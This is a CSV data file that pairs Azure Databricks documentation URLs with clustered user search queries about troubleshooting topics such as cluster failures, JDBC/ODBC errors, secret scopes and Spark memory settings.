cluster,url,search_text
6,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/cli/clusters-cli,spark.databricks.delta.format check.enabled
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/cli/instance-pools-cli,instances always running
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/cli/repos-cli,unable to delete a repo
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/cli/runs-cli,run submitted
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/cli/stack-cli,stack cli
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/cli/workspace-cli,clustereditinstanceprofilevalidationsuite is not registered to create private workspace
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/databricks-connect,could not locate executable null\bin\winutils.exe
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/databricks-utils,dbutils unmount mount command fails dbutils in streaming listener multiselect widget list of commands
1,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/dbeaver,databricks jdbc
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/dbx,vs code
4,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/python-sql-connector,sql server
0,https://docs.microsoft.com/en-us/azure/databricks/dev-tools/terraform/workspace-management,databricks_pipeline terraform
0,https://docs.microsoft.com/en-us/azure/databricks/error-messages/,change data feed cloud provider failure. azure vm extension stuck on transitioning state.
0,https://docs.microsoft.com/en-us/azure/databricks/getting-started/community-edition,community edition cannot login to the community edition unable to login community edition community workspace
3,https://docs.microsoft.com/en-us/azure/databricks/getting-started/free-training,access free customer training access free customer training access free customer training students - access to free self paced training
6,https://docs.microsoft.com/en-us/azure/databricks/getting-started/spark/,introduction to apache spark architecture
0,https://docs.microsoft.com/en-us/azure/databricks/getting-started/spark/datasets,upload dataset dataset file path object not serializable (class: com.microsoft.azure.eventhubs.connectionstringbuilder
0,https://docs.microsoft.com/en-us/azure/databricks/getting-started/spark/next,what is a repo
0,https://docs.microsoft.com/en-us/azure/databricks/ingestion/auto-loader/faq,how to correct bad data into autoloader autoloader not processing files in queue
0,https://docs.microsoft.com/en-us/azure/databricks/integrations/,repos for git integration partner connect
0,https://docs.microsoft.com/en-us/azure/databricks/integrations/bi/power-bi,power bi power bi power bi single sign on power bi power bi power bi
0,https://docs.microsoft.com/en-us/azure/databricks/integrations/bi/tableau,tableau server
1,https://docs.microsoft.com/en-us/azure/databricks/integrations/partner-connect/,partner connect partner connect databricks partner connect customer partner
0,https://docs.microsoft.com/en-us/azure/databricks/integrations/partner-connect/admin,fivetran partner connect partner connect
1,https://docs.microsoft.com/en-us/azure/databricks/integrations/partners,databricks partners partner connet partner capstones and accreditations enable partner connect partner login
0,https://docs.microsoft.com/en-us/azure/databricks/integrations/reverse-etl/hightouch,server hostname
0,https://docs.microsoft.com/en-us/azure/databricks/kb/administration/who-deleted-cluster,unexpected cluster termination
0,https://docs.microsoft.com/en-us/azure/databricks/kb/administration/who-deleted-workspace,recover deleted workspace
0,https://docs.microsoft.com/en-us/azure/databricks/kb/bi/configure-simba-azure-ad-creds,simba jdbc
1,https://docs.microsoft.com/en-us/azure/databricks/kb/bi/jdbc-odbc-troubleshooting,databricks odbc and jdbc drivers com.microsoft.sqlserver.jdbc.sqlserverexception: the connection is closed. odbc unexpected response from server during a http connection: ssl_connect: certificate verify failed.
0,https://docs.microsoft.com/en-us/azure/databricks/kb/bi/powerbi-proxy-ssl-configuration,"ssl cert error power bi tableau, ssl_connect: certificate verify failed power bi"
0,https://docs.microsoft.com/en-us/azure/databricks/kb/cloud/,azure udr
0,https://docs.microsoft.com/en-us/azure/databricks/kb/cloud/azure-vnet-gen1-issue,aad token for jdbc odbc
0,https://docs.microsoft.com/en-us/azure/databricks/kb/cloud/azure-vnet-jobs-not-progressing,unity catalog
0,https://docs.microsoft.com/en-us/azure/databricks/kb/cloud/custom-dns-routing,on premise gitlab
0,https://docs.microsoft.com/en-us/azure/databricks/kb/cloud/sas-requires-current-abfs-client,mount abfss sas
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/azure-core-limit,cloud provider launch failure
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/azure-ip-limit,cloud provider launch failure
1,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/azure-ssh-cluster-driver-node,customize containers with databricks container services
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/calculate-number-of-cores,estimating required number of memory
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/cluster-failed-launch,cluster failed to launch cloud provider
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/cluster-manager-limit,"""please reduce the number of instances in your request"" error please reduce the number of instances in your request,"
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/cluster-restart-fails-admin-user,restart cluster
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/cluster-terminated-driver-down,cluster does not start cluster not starting cluster does not start
6,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/conf-overwrites-default-settings,how to set spark executor memory
1,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/custom-docker-requires-root,customize containers with databricks container services
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/custom-garbage-collection-prevents-launch-dbr10,garbage collection
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/edited-policy-not-applied,cannot apply updated cluster policy
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/fail-create-cluster-tag-limit,the length cannot exceed 256 unicode characters in utf-8
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/spark-executor-memory,off heap memory
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/spark-shows-less-memory,executor memory
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/termination-reasons,cluster terminating unexpected cluster termination cluster terminated.reason:azure unexpected deployment template failure sku not available
0,https://docs.microsoft.com/en-us/azure/databricks/kb/clusters/unknown-host-exception-on-launch,temporary failure in name resolution
3,https://docs.microsoft.com/en-us/azure/databricks/kb/data-sources/access-blob-fails-wasb,azure blob blob access no credentials
0,https://docs.microsoft.com/en-us/azure/databricks/kb/data-sources/access-blobstore-odbc,write parquet datalake
0,https://docs.microsoft.com/en-us/azure/databricks/kb/data-sources/inconsistent-timestamp-results-jdbc,aad token for jdbc odbc
0,https://docs.microsoft.com/en-us/azure/databricks/kb/data-sources/jdbc-optimize-read,aad token for jdbc odbc
0,https://docs.microsoft.com/en-us/azure/databricks/kb/data-sources/use-cx-oracle-connect-server,use cx_oracle to connect to an oracle server how to connect to oracle
0,https://docs.microsoft.com/en-us/azure/databricks/kb/data-sources/wasb-check-blob-types,append blob
0,https://docs.microsoft.com/en-us/azure/databricks/kb/dbfs/,dbfs browsing
0,https://docs.microsoft.com/en-us/azure/databricks/kb/dbfs/dbfs-root-permissions,dbfs size
4,https://docs.microsoft.com/en-us/azure/databricks/kb/dbsql/,databricks sql databricks sql databricks sql access databricks sql
0,https://docs.microsoft.com/en-us/azure/databricks/kb/dbsql/display-null-as-nan,null column value
0,https://docs.microsoft.com/en-us/azure/databricks/kb/delta/delete-checkpoint-restart,delete your streaming query checkpoint and restart
0,https://docs.microsoft.com/en-us/azure/databricks/kb/delta/file-transaction-log-not-found,a file referenced in the transaction log cannot be found
0,https://docs.microsoft.com/en-us/azure/databricks/kb/delta/filereadexception-when-reading-delta-table,exception while reading checkpoint file in _delta_log folder exception while reading checkpoint file in _delta_log folder
0,https://docs.microsoft.com/en-us/azure/databricks/kb/delta/id-duplicate-on-append,identify duplicate data identify duplicate data on append operations
2,https://docs.microsoft.com/en-us/azure/databricks/kb/delta/optimize-delta-sink-structured-streaming,delta optimize and structured streaming
1,https://docs.microsoft.com/en-us/azure/databricks/kb/dev-tools/dbcli-win-fail-create-process,databricks cli
0,https://docs.microsoft.com/en-us/azure/databricks/kb/dev-tools/geospark-undefined-function-error-dbconnect,geospark undefined function error with dbconnect
1,https://docs.microsoft.com/en-us/azure/databricks/kb/dev-tools/invalid-access-token-airflow,"when i run a databricks job from airflow, i get an error token 403 aad token for jdbc odbc"
6,https://docs.microsoft.com/en-us/azure/databricks/kb/jobs/azure-spark-shuffle-fetch-fail,"getting error ""shuffle partition number too small"" job aborted due to stage failure: shufflemapstage 50852 (count at &lt;unknown&gt;:0) has failed the maximum allowable number of times: 4. most recent failure reason: org.apache.spark.shuffle.metadatafetchfailedexception: missing an output location for shuffle 3409 	at org.apache.spark.mapoutputtracker$.$anonfun$convertmapstatuses$2(mapoutputtracker.scala:1163) 	at org.apache.spark.m job aborted due to stage failure: shufflemapstage 50852 (count at &lt;unknown&gt;:0) has failed the maximum allowable number of times: 4. most recent failure reason: org.apache.spark.shuffle.metadatafetchfailedexception: missing an output location for shuffle 3409 	at org.apache.spark.mapoutputtracker$.$anonfun$convertmapstatuses$2(mapoutputtracker.scala:1163) 	at org.apache.spark.m"
0,https://docs.microsoft.com/en-us/azure/databricks/kb/jobs/howto-jobsdeleterestapi,help with purge
0,https://docs.microsoft.com/en-us/azure/databricks/kb/jobs/job-cluster-limit-nb-output,warning: skipped 44535 bytes of output job clusters
3,https://docs.microsoft.com/en-us/azure/databricks/kb/jobs/job-fails-invalid-access-token,invalid access token aad token for jdbc odbc
6,https://docs.microsoft.com/en-us/azure/databricks/kb/jobs/job-fails-maxresultsize-exception,is bigger than spark.driver.maxresultsize
0,https://docs.microsoft.com/en-us/azure/databricks/kb/jobs/job-rate-limit,rate limiting
0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/,libraries failing
0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/cannot-import-egg-module,local python module import
0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/cant-uninstall-libraries,cannot uninstall library
0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/init-script-fail-download-maven,init script init scripts
0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/install-cartopy-on-cluster,errors when pip install leach_package
0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/install-package-cran-snapshot,library installation failed for library due to infra fault
0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/library-fail-dependency-exception,could not find a version that satisfies the requirement
1,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/maven-library-version-mgmt,library in azure databricks
0,https://docs.microsoft.com/en-us/azure/databricks/kb/libraries/pystan-fails-dbr64es,could not find a version that satisfies the requirement
0,https://docs.microsoft.com/en-us/azure/databricks/kb/machine-learning/h2o-cluster-not-reachable-exception,sparkling water h2o and sparkling water on aws cluster
0,https://docs.microsoft.com/en-us/azure/databricks/kb/machine-learning/mlflow-artifacts-custom-storage,artifact location
6,https://docs.microsoft.com/en-us/azure/databricks/kb/metastore/create-table-ddl-for-metastore,"dbs = spark.catalog.listdatabases() for db in dbs:   f = open(""your_file_name_{}.ddl"".format(db.name), ""w"")   tables = spark.catalog.listtables(db.name)"
0,https://docs.microsoft.com/en-us/azure/databricks/kb/metastore/hive-metastore-troubleshooting,unity catalog
0,https://docs.microsoft.com/en-us/azure/databricks/kb/metastore/list-tables,unity catalog
0,https://docs.microsoft.com/en-us/azure/databricks/kb/metastore/parquet-timestamp-requires-msver12,parquet timestamp requires hive metastore 1.2 or above
6,https://docs.microsoft.com/en-us/azure/databricks/kb/metrics/spark-metrics,apache spark executor memory allocation
0,https://docs.microsoft.com/en-us/azure/databricks/kb/notebooks/failure-when-mounting-storage,mount nullpointerexception
0,https://docs.microsoft.com/en-us/azure/databricks/kb/notebooks/get-notebooks-deleted-user,delete a user account
0,https://docs.microsoft.com/en-us/azure/databricks/kb/notebooks/item-too-large-to-export,export notebook
0,https://docs.microsoft.com/en-us/azure/databricks/kb/notebooks/json-reader-parses-value-as-null,streamingqueryexception: next on empty iterator
0,https://docs.microsoft.com/en-us/azure/databricks/kb/python/dbfs-file-size-limit,dbfs size
0,https://docs.microsoft.com/en-us/azure/databricks/kb/python/function-object-no-attribute,module os has no attribute error
0,https://docs.microsoft.com/en-us/azure/databricks/kb/python/import-custom-ca-cert,"""failed to establish a new connection: [errno 110] connection timed out"" how to complete the certification"
0,https://docs.microsoft.com/en-us/azure/databricks/kb/r/rmarkdown-sparklyr-code,r markdown
0,https://docs.microsoft.com/en-us/azure/databricks/kb/scala/intermittent-nullpointerexception-aqe-enabled,intermittent nullpointerexception when aqe is enabled
4,https://docs.microsoft.com/en-us/azure/databricks/kb/sql/,"""it is possible the underlying files have been updated. you can explicitly invalidate the cache in spark by running 'refresh table tablename' command in sql or by recreating the dataset/dataframe involved. if delta cache is stale or the underlying files have been removed, you can invalidate delta cache manually by restarting the cluster"" get secret via sql databricksexceptions$sqlexecutionexception: java.sql.sqlexception: unsupported type null python sql table to file the instance of the sql server database engine cannot obtain a lock resource at this time sql variables sql with apache spark"
0,https://docs.microsoft.com/en-us/azure/databricks/kb/sql/dupe-column-in-metadata,display the column that have duplicate records
0,https://docs.microsoft.com/en-us/azure/databricks/kb/sql/error-run-msck-repair-table-parallel,error when accessing model runs
5,https://docs.microsoft.com/en-us/azure/databricks/kb/sql/global-temp-view-not-found,"error in sql statement: amazons3exception: access denied; request: put https://amgen-edl-databricks-e2-gco-bkt.s3-us-west-2.amazonaws.com oregon-prod/972620489536740/user/hive/warehouse/pharmaace_tblndc_gastric_0406/ {} aws-sdk-java/1.11.655 linux/5.4.0-1071-aws openjdk_64-bit_server_vm/25.292-b10 java/1.8.0_292 scala/2.12.10 vendor/azul_systems,_inc. com.amazonaws.services.s3.model.putobjectrequest; request id: 6c3t9ck9e60dfdbd, extended request id: grrpgjt4w/g8h6xlqligyobpozw6drkjatqbujnv8qitb ""table or view not found"" analysisexception: table or view not found"
0,https://docs.microsoft.com/en-us/azure/databricks/kb/sql/jdbc-write-fails-primarykeyviolation,aad token for jdbc odbc
0,https://docs.microsoft.com/en-us/azure/databricks/kb/streaming/kafka-no-resolvable-bootstrap-urls,cluster terminated.reason:self bootstrap failure self-bootstrap failure
6,https://docs.microsoft.com/en-us/azure/databricks/kb/streaming/readstream-is-not-whitelisted,py4j.security.py4jsecurityexception: constructor public com.databricks.backend.daemon.dbutils.fsutilsparallel(org.apache.spark.sparkcontext) is not whitelisted.
0,https://docs.microsoft.com/en-us/azure/databricks/kb/streaming/streaming-job-stuck-writing-checkpoint,streaming job
0,https://docs.microsoft.com/en-us/azure/databricks/languages/pandas-spark,pandas cut
1,https://docs.microsoft.com/en-us/azure/databricks/languages/python,azure databricks api load data python
0,https://docs.microsoft.com/en-us/azure/databricks/libraries/,"pydocumentdb library install library install library cluster library ""yml"""
1,https://docs.microsoft.com/en-us/azure/databricks/libraries/cluster-libraries,"cluster libraries fail to install python library glpk failed to install a python library \""glpk\"" by ui cluster-library-pypi\r \r errro message:\r java.lang.runtimeexception: managedlibraryinstallfailed: org.apache.spark.sparkexception: process list(/databricks/python/bin/pip, install, glpk, --disable-pip-version-check) exited with code 1.   error: command errored out with exit status 1:\r    command: /databricks/python3/bin/python /databricks/python3/lib/python3.8/site-packages/pip/_vendor/pep517/_in_process cluster libraries init script libraries won't load unable to use installed wheel cluster library"
0,https://docs.microsoft.com/en-us/azure/databricks/libraries/notebooks-python-libraries,notebook-scoped python libraries install python module
0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/,notebook add command how to delete a notebook reference variables between notebooks recover deleted notebook import notebook copy notebook path search text in all notebooks import notebook import notebook import notebooks import notebook import notebook how do i add a code chunk to a notebook attach notebook dynamically jupyter notebook version import notebooks notebook private email the contents of a notebook share notebook import notebook
0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/azure-devops-services-version-control,git integration notebook version control azure devops repos for git missing
6,https://docs.microsoft.com/en-us/azure/databricks/notebooks/dashboards,databricks dashboard integrate spark
0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/notebook-workflows,retry logic
0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/notebooks-manage,execution context jar files
0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/notebooks-use,hide result keyboard shortcut dark theme dark theme hide result multiple cells
0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/package-cells,import python packages
0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/visualizations/charts-and-graphs-python,visualization deep dive in python
1,https://docs.microsoft.com/en-us/azure/databricks/notebooks/visualizations/ggplot2,ggplot2 in r notebooks - databricks
0,https://docs.microsoft.com/en-us/azure/databricks/notebooks/visualizations/html-d3-and-svg,export notebook output to html
1,https://docs.microsoft.com/en-us/azure/databricks/notebooks/widgets,databricks widgets widget panel widget runtime
0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/,platform release
0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2018/august,init script
1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2018/november,cross origin resource sharing azure databricks
0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2019/january,on premise gitlab
0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2019/october,on premise gitlab
0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2021/june,keyboard shortcut
0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2021/november,"""data profile"" data profiling"
0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/product/2022/february,dag visualization
6,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/10.0,"org.apache.spark.sparkexception: job aborted due to stage failure: task 13 in stage 12.0 failed 4 times, most recent failure: lost task 13.3 in stage 12.0 (tid 453) (10.54.76.20 executor 17): java.net.connectexception: connection refused (connection refused)"
1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/10.1ml,how to check the version of databricks runtime for machine learning
1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/10.3ml,how to check the version of databricks runtime for machine learning
1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/10.x-migration,databricks runtime 10.x migration guide runtime 10 issues
1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/4.2,databricks runtime
0,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/6.3ml,comando monstra as pastas
1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/6.4,databricks 6.4  azure extended support
1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/7.0ml,databricks ml runtime
1,https://docs.microsoft.com/en-us/azure/databricks/release-notes/runtime/7.2,com.databricks.workflowexception: com.databricks.notebookexecutionexception: timedout
0,https://docs.microsoft.com/en-us/azure/databricks/repos/,repos for git integration on premise gitlab git integration repos for git integration repos clone unable to delete a repo private git repo
0,https://docs.microsoft.com/en-us/azure/databricks/repos/gitlab-version-control,on premise gitlab on premise gitlab
0,https://docs.microsoft.com/en-us/azure/databricks/repos/jobs-remote-notebook,repository notebooks job error
0,https://docs.microsoft.com/en-us/azure/databricks/resources/limits,what is the limit of tasks in one job
0,https://docs.microsoft.com/en-us/azure/databricks/resources/platform-release,platform release
0,https://docs.microsoft.com/en-us/azure/databricks/resources/supported-browsers,create support ticket
1,https://docs.microsoft.com/en-us/azure/databricks/runtime/dbr,databricks runtime databricks runtime download upgrade runtime
0,https://docs.microsoft.com/en-us/azure/databricks/scenarios/connect-databricks-excel-python-r,download csv
1,https://docs.microsoft.com/en-us/azure/databricks/scenarios/databricks-cli-from-azure-cloud-shell,databricks cli
1,https://docs.microsoft.com/en-us/azure/databricks/scenarios/databricks-connect-to-data-sources,event hub write data from azure databricks to azure web apps how do we send data into promethues from databricks? (approach assistance to integrate databricks and promethues
0,https://docs.microsoft.com/en-us/azure/databricks/scenarios/frequently-asked-questions-databricks,cloud provider launch failure
0,https://docs.microsoft.com/en-us/azure/databricks/scenarios/quickstart-create-databricks-workspace-portal,upgrade premium
1,https://docs.microsoft.com/en-us/azure/databricks/scenarios/quickstart-create-databricks-workspace-powershell,databricks workspace
0,https://docs.microsoft.com/en-us/azure/databricks/scenarios/quickstart-create-databricks-workspace-vnet-injection,managed resource group virtual machine
6,https://docs.microsoft.com/en-us/azure/databricks/scenarios/service-endpoint-cosmosdb,facing issue while writing data to cosmos through spark
4,https://docs.microsoft.com/en-us/azure/databricks/scenarios/vnet-injection-sql-server,sql server
1,https://docs.microsoft.com/en-us/azure/databricks/scenarios/what-is-azure-databricks-ws,what data formats are supported in databricks
0,https://docs.microsoft.com/en-us/azure/databricks/scenarios/workspace/,data science & engineering? workspace tutorial
3,https://docs.microsoft.com/en-us/azure/databricks/security/access-control/,not able to access my  data bricks account how to get the report for table access control list. table access control azure
3,https://docs.microsoft.com/en-us/azure/databricks/security/access-control/cluster-acl,cluster access contro
3,https://docs.microsoft.com/en-us/azure/databricks/security/access-control/dlt-acl,cluster unable to access delta tables and s3
0,https://docs.microsoft.com/en-us/azure/databricks/security/access-control/pool-acl,configure pool permissions
0,https://docs.microsoft.com/en-us/azure/databricks/security/access-control/table-acls/,upgrade premium
3,https://docs.microsoft.com/en-us/azure/databricks/security/access-control/workspace-acl,not able to access my  data bricks account artifact location
0,https://docs.microsoft.com/en-us/azure/databricks/security/credential-passthrough/,"credential passthrough with r on high concurrency cluster anonymous credentials, and no credentials found for them  in the configuration. credential passthrough credential passthrough"
1,https://docs.microsoft.com/en-us/azure/databricks/security/credential-passthrough/adls-passthrough,com.databricks.backend.daemon.data.client.adl.azurecredentialnotfoundexception: could not find adls gen2 token
0,https://docs.microsoft.com/en-us/azure/databricks/security/data-governance,data governance
0,https://docs.microsoft.com/en-us/azure/databricks/security/keys/customer-managed-key-managed-services-azure,writestream encrypt
0,https://docs.microsoft.com/en-us/azure/databricks/security/keys/customer-managed-keys,is incompatible with nvarchar encrypted
0,https://docs.microsoft.com/en-us/azure/databricks/security/keys/customer-managed-keys-dbfs/cmk-dbfs-azure-portal,key vault
0,https://docs.microsoft.com/en-us/azure/databricks/security/keys/double-encryption,writestream encrypt
3,https://docs.microsoft.com/en-us/azure/databricks/security/secrets/,secret scope secret access control secret manager
3,https://docs.microsoft.com/en-us/azure/databricks/security/secrets/secret-scopes,user scope create scope create scope azure secret scope secret scope upgrade premium create secret scope secret scope secret scope rename secrets scope secret scope secret scope url secret scope unexpected cluster termination secret scopes secret scope secret does not exist with scope secret access control secret scope create scope secret scopes secret scope secret scope secret scope create scope
1,https://docs.microsoft.com/en-us/azure/databricks/security/secrets/secrets,secret does not exist with scope where to find secrets databricks-connect secrets workspace create secret scope
0,https://docs.microsoft.com/en-us/azure/databricks/security/security-overview-azure,is incompatible with nvarchar encrypted
2,https://docs.microsoft.com/en-us/azure/databricks/spark/2.x/spark-sql/language-manual/alter-table-partition,drop partition from delta table
5,https://docs.microsoft.com/en-us/azure/databricks/spark/2.x/spark-sql/language-manual/create-table,create a parquet table how to create a table
4,https://docs.microsoft.com/en-us/azure/databricks/spark/2.x/spark-sql/language-manual/insert,insert sql stream
0,https://docs.microsoft.com/en-us/azure/databricks/spark/2.x/spark-sql/language-manual/load-data,load file in filesystem
5,https://docs.microsoft.com/en-us/azure/databricks/spark/2.x/spark-sql/language-manual/show-table-properties,table properties
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/dataframes-datasets/,dataframe lib display dataframe scal dataset file path
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/dataframes-datasets/dates-timestamps,time zone
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/dataframes-datasets/introduction-to-dataframes-python,introduction to dataframes - python repartition pyspark dataframe
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/dataframes-datasets/introduction-to-datasets,dataset file path
4,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/,enable databricks sql
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/data-types/date-type,compare dates
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/data-types/decimal-type,convert double to decimal
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/data-types/struct-type,"can't extract value from margin#2032585: need struct type but got decimal(18,4); line 9 pos 1"
5,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/delta-delete-from,delete table recover deleted branch in repo delete account
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/delta-merge-into,merge into
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/delta-vacuum,vacuum filealreadyexistsexception
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/aes_decrypt,encryption_algorithm_name = 'aead_aes_256_cbc_hmac_sha_256'
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/character_length,maximum field length
4,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/contains,insert sql stream
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/date_trunc,date trunc trunc date
4,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/endswith,streamwrite with azure sql
1,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/find_in_set,how to find the azure databricks dbu usage
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/isnullop,dataframe remove null count null in column
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/java_method,java location
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/raise_error,aws error rpc client disconnected error
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/to_date,cast  as date
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/trim,trim space
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/version,tensorflow version
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/functions/xpath_string,typeerror 'str' object is not callable pyspark
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/security-revoke,revoke all privileges on schema
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/security-show-grant,show grant
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-datatype-rules,is incompatible with nvarchar encrypted
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-datatypes,data types data types
5,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-external-locations,external table
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-functions,subselect in function
0,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-functions-udf-aggregate,object not serializable (class: com.microsoft.azure.eventhubs.connectionstringbuilder
1,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-json-path-expression,java.lang.unsupportedoperationexception: com.databricks.backend.daemon.data.client.dbfsv1.resolvepathonphysicalstorage(path: path)
5,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-names,no module named tensorflow modulenotfounderror: no module named 'mlflow' additional queries on that table must be named. alias column
2,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-partition,drop partition delta table
2,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-sharing,send email delta sharing
6,https://docs.microsoft.com/en-us/azure/databricks/spark/latest/spark-sql/language-manual/sql-ref-syntax-aux-conf-mgmt-set,hour settings how to set spark executor memory
